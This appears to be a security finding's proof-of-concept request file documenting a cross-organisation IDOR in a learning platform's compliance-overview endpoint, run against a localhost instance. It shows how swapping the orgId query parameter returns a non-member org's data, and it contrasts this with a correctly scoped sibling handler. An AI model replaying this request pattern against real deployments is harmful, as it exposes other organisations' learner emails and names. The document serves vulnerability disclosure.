### VULN-014 — Dashboard compliance-overview cross-org PII IDOR
### Admin is a member of ONLY org 48bbdff8 (CVE Hunt Academy). Session cookie omitted for brevity.

### [1] Read OUR OWN org — endpoint returns learner emails (PII).
GET http://localhost:21527/dash/compliance-overview?orgId=48bbdff8-2ad5-46a3-a259-2ca3d52677dd
Cookie: classroomio.session_token=<ADMIN_SESSION>
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
### -> HTTP 200 { data: { summary:{totalLearners:1,...}, learners:[{ email:"u_...@cvehunt.local", fullname, status, ... }] } }

### [2] IDOR: query a DIFFERENT org (we are NOT a member) — header stays OUR org.
GET http://localhost:21527/dash/compliance-overview?orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583
Cookie: classroomio.session_token=<ADMIN_SESSION>
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
### -> HTTP 200 (NOT 403) scoped to org f0259e1a (our seeded learner absent) — the query orgId
###    selects the data; a non-member org is served. Against a populated victim org this returns
###    that org's learner emails/names.

### [contrast] The SAFE sibling handler ignores the query orgId (uses c.get('orgId')).
GET http://localhost:21527/dash/top-courses?orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583&days=30
Cookie: classroomio.session_token=<ADMIN_SESSION>
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
### -> HTTP 200 scoped to OUR org (stats.ts:128 uses the authorized header org).
